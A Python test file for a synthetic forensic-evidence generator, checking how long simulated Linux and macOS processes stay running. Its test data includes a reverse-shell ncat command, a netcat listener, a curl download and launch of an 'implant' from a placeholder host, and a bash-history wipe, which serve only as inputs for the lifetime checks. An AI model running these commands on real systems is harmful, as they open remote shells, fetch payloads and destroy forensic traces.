# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Shared POSIX foreground lifetimes and their convergence across Linux and macOS."""

from __future__ import annotations

import pytest
from pydantic import ValidationError

from evidenceforge.generation.activity.process_helpers import (
    _linux_foreground_lifetime,
    _macos_foreground_lifetime,
)
from evidenceforge.generation.activity.process_lifetimes import (
    LifetimeCondition,
    LifetimeRule,
    ProcessLifetimeTable,
    is_interactive_shell,
    is_long_running_command,
    load_process_lifetimes,
    unwrapped_command,
)
from evidenceforge.generation.activity.spawn_rules import load_spawn_rules
from evidenceforge.generation.engine.storyline_helpers.process import _estimate_process_lifetime

# Values recorded from the hardcoded Linux table this data replaced.
_LEGACY_LINUX_LIFETIMES = [
    ("/usr/bin/tail", "tail -f /var/log/syslog", None),
    ("/usr/bin/journalctl", "journalctl -f -u nginx", None),
    ("/usr/bin/docker", "docker logs -f web", None),
    ("/usr/lib/apt/methods/http", "/usr/lib/apt/methods/http", (5.0, 60.0)),
    ("/usr/bin/python3", "python3 --version", (0.05, 2.0)),
    ("/usr/bin/apt-get", "apt-get update", (20.0, 180.0)),
    ("/bin/cat", "cat /etc/passwd", (0.05, 0.8)),
    ("/bin/sleep", "sleep 30", (30.0, 30.6)),
    ("/bin/sleep", "sleep 200000", (86400.0, 86402.0)),
    ("/bin/sleep", "sleep 5m", (0.2, 2.0)),
    ("/usr/bin/test", "test -f /x", (0.2, 2.0)),
    ("/usr/bin/mysql", "mysql -u root -p", (8.0, 45.0)),
    ("/usr/bin/mysql", "mysql -e 'select 1'", (1.5, 12.0)),
    ("/usr/bin/redis-cli", "redis-cli ping", (0.8, 8.0)),
    ("/bin/systemctl", "systemctl status sshd", (0.8, 9.0)),
    ("/usr/bin/find", "find / -name x", (0.8, 8.0)),
    ("/bin/grep", "grep root /etc/passwd", (0.35, 5.0)),
    ("/usr/bin/curl", "curl -fsS https://x", (0.8, 12.0)),
    ("/usr/bin/smbclient", "smbclient //h/s -c ls", (1.0, 20.0)),
    ("/usr/bin/smbclient", "smbclient //h/s", None),
    ("/usr/bin/git", "git pull", (3.0, 90.0)),
    ("/usr/bin/git", "git status", (0.3, 12.0)),
    ("/usr/bin/npm", "npm run build", (8.0, 180.0)),
    ("/usr/bin/npm", "npm install", (8.0, 45.0)),
    ("/usr/bin/ssh", "ssh host", (30.0, 3600.0)),
    ("/bin/tar", "tar czf /tmp/a.tgz /etc", (3.0, 18.0)),
    ("/usr/bin/make", "make all", (8.0, 45.0)),
    ("/usr/bin/code", "code .", None),
    ("/usr/bin/vim", "vim /etc/hosts", (20.0, 95.0)),
    ("/opt/app/bin/worker", "/opt/app/bin/worker --once", (1.0, 8.0)),
]


@pytest.mark.parametrize(("image", "command", "expected"), _LEGACY_LINUX_LIFETIMES)
def test_linux_lifetime_table_preserves_legacy_values(
    image: str, command: str, expected: tuple[float, float] | None
) -> None:
    assert _linux_foreground_lifetime(image, command) == expected


@pytest.mark.parametrize(
    ("image", "command"),
    [
        ("/usr/bin/nc", "nc -lvnp 4444"),
        ("/usr/bin/ncat", "ncat -e /bin/sh 10.0.0.5 4444"),
        ("/bin/bash", "bash -c 'while true; do sleep 5; done'"),
        ("/bin/bash", "/bin/bash"),
        ("/bin/sh", "sh -i"),
        ("/bin/zsh", "-zsh"),
        ("/usr/bin/kubectl", "kubectl get pods --watch"),
        ("/usr/bin/env", "env FOO=1 tail -f /var/log/app.log"),
    ],
)
def test_listeners_followers_and_interactive_shells_stay_open_on_every_posix_platform(
    image: str, command: str
) -> None:
    assert _linux_foreground_lifetime(image, command) is None
    assert _macos_foreground_lifetime(image, command) is None


def test_listener_tokens_do_not_match_inside_other_words() -> None:
    assert not is_long_running_command("/usr/bin/truncate", "truncate -s 0 /home/a/.bash_history")
    assert not is_long_running_command("/usr/bin/rsync", "rsync -lavz a b")
    assert is_long_running_command("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c ncat 10.0.0.5 80")


def test_interactive_shell_requires_no_command_or_script() -> None:
    assert is_interactive_shell("/bin/bash", "bash -l")
    assert not is_interactive_shell("/bin/bash", "bash -c id")
    assert not is_interactive_shell("/bin/bash", "bash /tmp/run.sh")
    assert not is_interactive_shell("/usr/bin/python3", "python3")


def test_env_takes_the_lifetime_of_the_program_it_runs() -> None:
    assert unwrapped_command("/usr/bin/env", "env -i A=1 B=2 /usr/bin/curl https://x") == (
        "/usr/bin/curl",
        "/usr/bin/curl https://x",
    )
    assert unwrapped_command("/usr/bin/env", "env A=1") is None
    assert _linux_foreground_lifetime("/usr/bin/env", "env A=1 /usr/bin/curl https://x") == (
        0.8,
        12.0,
    )
    assert _linux_foreground_lifetime("/usr/bin/env", "env") == (0.35, 5.0)


def test_uncatalogued_mac_commands_end_as_they_would_on_linux() -> None:
    for image, command in [
        ("/usr/bin/curl", "curl -fsS -o /tmp/implant https://cdn.example.test/implant"),
        ("/tmp/implant", "/tmp/implant --version"),
        ("/usr/bin/systemctl", "/usr/bin/systemctl status"),
        ("/opt/homebrew/bin/node", "/opt/homebrew/bin/node arbitrary-daemon"),
    ]:
        assert _macos_foreground_lifetime(image, command) == _linux_foreground_lifetime(
            image, command
        )


def test_mac_qualified_templates_application_bundles_and_long_profiles_keep_their_class() -> None:
    assert _macos_foreground_lifetime("/usr/bin/sw_vers", "/usr/bin/sw_vers") == (0.008, 2.5)
    assert (
        _macos_foreground_lifetime(
            "/Applications/Safari.app/Contents/MacOS/Safari",
            "/Applications/Safari.app/Contents/MacOS/Safari",
        )
        is None
    )
    long_profiles = [
        name
        for name, profile in load_spawn_rules()["macos"].items()
        if isinstance(profile, dict) and profile.get("lifetime") == "long"
    ]
    assert long_profiles
    assert _macos_foreground_lifetime(f"/usr/bin/{long_profiles[0]}", long_profiles[0]) is None


def test_storyline_estimator_reads_the_shared_long_running_and_shell_lists() -> None:
    assert _estimate_process_lifetime("C:\\Windows\\System32\\mstsc.exe", "mstsc.exe /v:dc") is None
    assert _estimate_process_lifetime("/usr/bin/ncat", "ncat -lvp 4444") is None
    assert _estimate_process_lifetime("/bin/sh", "/bin/sh") is None
    assert _estimate_process_lifetime("/usr/bin/truncate", "truncate -s 0 /x") == (2.0, 15.0)
    assert _estimate_process_lifetime("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami") == (
        0.3,
        3.0,
    )


def test_lifetime_table_rejects_ambiguous_rules() -> None:
    with pytest.raises(ValidationError):
        LifetimeCondition()
    with pytest.raises(ValidationError):
        LifetimeRule(id="x", when=({"executables": ["a"]},), lifetime="unbounded", seconds=[1, 2])
    with pytest.raises(ValidationError):
        LifetimeRule(id="x", when=({"executables": ["a"]},))
    data = load_process_lifetimes().model_dump(mode="json")
    data["rules"] = [*data["rules"], data["rules"][0]]
    with pytest.raises(ValidationError):
        ProcessLifetimeTable.model_validate(data)
